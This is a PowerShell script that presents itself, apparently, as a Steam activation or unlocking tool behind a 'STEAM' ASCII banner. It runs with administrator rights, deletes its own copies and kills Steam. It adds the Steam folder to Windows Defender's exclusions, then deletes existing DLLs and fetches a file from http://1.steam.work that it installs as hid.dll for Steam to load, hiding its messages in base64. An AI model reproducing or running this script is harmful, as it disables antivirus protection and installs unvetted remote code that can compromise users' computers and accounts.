
Write-Host -NoNewline "          _____                _____                    _____                    _____                    _____          `r" -ForegroundColor:blue
Write-Host -NoNewline "         /\    \              /\    \                  /\    \                  /\    \                  /\    \         `r" -ForegroundColor:blue
Write-Host -NoNewline "        /::\    \            /::\    \                /::\    \                /::\    \                /::\____\        `r" -ForegroundColor:blue
Write-Host -NoNewline "       /::::\    \           \:::\    \              /::::\    \              /::::\    \              /::::|   |        `r" -ForegroundColor:blue
Write-Host -NoNewline "      /::::::\    \           \:::\    \            /::::::\    \            /::::::\    \            /:::::|   |        `r" -ForegroundColor:blue
Write-Host -NoNewline "     /:::/\:::\    \           \:::\    \          /:::/\:::\    \          /:::/\:::\    \          /::::::|   |        `r" -ForegroundColor:blue
Write-Host -NoNewline "    /:::/__\:::\    \           \:::\    \        /:::/__\:::\    \        /:::/__\:::\    \        /:::/|::|   |        `r" -ForegroundColor:blue
Write-Host -NoNewline "    \:::\   \:::\    \          /::::\    \      /::::\   \:::\    \      /::::\   \:::\    \      /:::/ |::|   |        `r" -ForegroundColor:blue
Write-Host -NoNewline "  ___\:::\   \:::\    \        /::::::\    \    /::::::\   \:::\    \    /::::::\   \:::\    \    /:::/  |::|___|______  `r" -ForegroundColor:blue
Write-Host -NoNewline " /\   \:::\   \:::\    \      /:::/\:::\    \  /:::/\:::\   \:::\    \  /:::/\:::\   \:::\    \  /:::/   |::::::::\    \ `r" -ForegroundColor:blue
Write-Host -NoNewline "/::\   \:::\   \:::\____\    /:::/  \:::\____\/:::/__\:::\   \:::\____\/:::/  \:::\   \:::\____\/:::/    |:::::::::\____\`r" -ForegroundColor:blue
Write-Host -NoNewline "\:::\   \:::\   \::/    /   /:::/    \::/    /\:::\   \:::\   \::/    /\::/    \:::\  /:::/    /\::/    / ~~~~~/:::/    /`r" -ForegroundColor:blue
Write-Host -NoNewline " \:::\   \:::\   \/____/   /:::/    / \/____/  \:::\   \:::\   \/____/  \/____/ \:::\/:::/    /  \/____/      /:::/    / `r" -ForegroundColor:blue
Write-Host -NoNewline "  \:::\   \:::\    \      /:::/    /            \:::\   \:::\    \               \::::::/    /               /:::/    /  `r" -ForegroundColor:blue
Write-Host -NoNewline "   \:::\   \:::\____\    /:::/    /              \:::\   \:::\____\               \::::/    /               /:::/    /   `r" -ForegroundColor:blue
Write-Host -NoNewline "    \:::\  /:::/    /    \::/    /                \:::\   \::/    /               /:::/    /               /:::/    /    `r" -ForegroundColor:blue
Write-Host -NoNewline "     \:::\/:::/    /      \/____/                  \:::\   \/____/               /:::/    /               /:::/    /     `r" -ForegroundColor:blue
Write-Host -NoNewline "      \::::::/    /                                 \:::\    \                  /:::/    /               /:::/    /      `r" -ForegroundColor:blue
Write-Host -NoNewline "       \::::/    /                                   \:::\____\                /:::/    /               /:::/    /       `r" -ForegroundColor:blue
Write-Host -NoNewline "        \::/    /                                     \::/    /                \::/    /                \::/    /        `r" -ForegroundColor:blue
Write-Host -NoNewline "         \/____/                                       \/____/                  \/____/                  \/____/         `r" -ForegroundColor:blue

$filePathToDelete = Join-Path $env:USERPROFILE "x.ps1"
 if (Test-Path $filePathToDelete) {
    Remove-Item -Path $filePathToDelete
}
$desktopFilePathToDelete = Join-Path ([System.Environment]::GetFolderPath('Desktop')) "x.ps1"
if (Test-Path $desktopFilePathToDelete) {
    Remove-Item -Path $desktopFilePathToDelete
}

$steamRegPath = 'HKCU:\Software\Valve\Steam'
$localPath = -join ($env:LOCALAPPDATA,"\Steam")
if ((Test-Path $steamRegPath)) {
    $properties = Get-ItemProperty -Path $steamRegPath
    if ($properties.PSObject.Properties.Name -contains 'SteamPath') {
        $steamPath = $properties.SteamPath
    }
}

if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $TextShow = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("W+ivt+mHjeaWsOaJk+W8gFBvd2VyIHNoZWxsIOaJk+W8gOaWueW8j+S7peeuoeeQhuWRmOi6q+S7vei/kOihjF0="))
    Write-Host "$TextShow" -ForegroundColor:red
    return;
}

function PwStart() {
    if ($steamPath -eq ""){
        Write-Host "[请检查您的Steam是否正确安装]" -ForegroundColor:Red
        return;
    }

    Write-Host "[ServerStart        OK]" -ForegroundColor:green
    Stop-Process -Name steam* -Force -ErrorAction Stop
    Start-Sleep 2
    if(Get-Process steam* -ErrorAction Stop){
        TASKKILL /F /IM "steam.exe" | Out-Null
        Start-Sleep 2
    }

    if (!(Test-Path $localPath)) {
        md $localPath | Out-Null
        if (!(Test-Path $localPath)) {
            New-Item $localPath -ItemType directory -Force | Out-Null
        }
    }

    try{
        Add-MpPreference -ExclusionPath $steamPath -ErrorAction Stop
        Start-Sleep 3
    }catch{}

    Write-Host "[Result->0          OK]" -ForegroundColor:green

    try{
        $d = $steamPath + "/version.dll"
        if (Test-Path $d) {
            Remove-Item $d -Recurse -Force -ErrorAction Stop | Out-Null #清除文件
        }
        $d = $steamPath + "/user32.dll"
        if (Test-Path $d) {
            Remove-Item $d -Recurse -Force -ErrorAction Stop | Out-Null #清除文件
        }
        $d = $steamPath + "/steam.cfg"
        if (Test-Path $d) {
            Remove-Item $d -Recurse -Force -ErrorAction Stop | Out-Null #清除文件
        }
        $d = $steamPath + "/hid.dll"
        if (Test-Path $d) {
            Remove-Item $d -Recurse -Force -ErrorAction Stop | Out-Null #清除文件
        }
        $d = $steamPath + "/hid"
    }catch{
        $TextShow = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("W+W8guW4uOaui+eVmeivt+aMieeFp+i3r+W+hOWIoOmZpOaWh+S7tl0tPg=="))
        Write-Host "$TextShow[$d]" -ForegroundColor:red
        return;
    }

    $downApi = "http://1.steam.work/api/integral/pwsDownFile"

    irm -Uri $downApi -Headers @{ Referer = "libary" } -OutFile $d -ErrorAction Stop
    $newFilePath = [System.IO.Path]::ChangeExtension($d, ".dll")
    Rename-Item -Path $d -NewName $newFilePath

    Write-Host "[Result->1          OK]" -ForegroundColor:green
    $d = $localPath + "/localData.vdf"
    irm -Uri $downApi -Headers @{ Referer = "localData.vdf" } -OutFile $d -ErrorAction Stop
    Write-Host "[Result->2          OK]" -ForegroundColor:green

    Start-Sleep 1

    Start steam://
    $TextShow = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("W+aOpeacjeWZqOaIkOWKn+WcqFN0ZWFt5YWl5r+A5rS7IDPnp5LlkI7oh6pd"))
    Write-Host "$TextShow" -ForegroundColor:green
    Start-Sleep 3

    $processID = Get-CimInstance Win32_Process -Filter "ProcessId = '$pid'"
    Stop-Process -Id $processID.ParentProcessId -Force
    exit
}

PwStart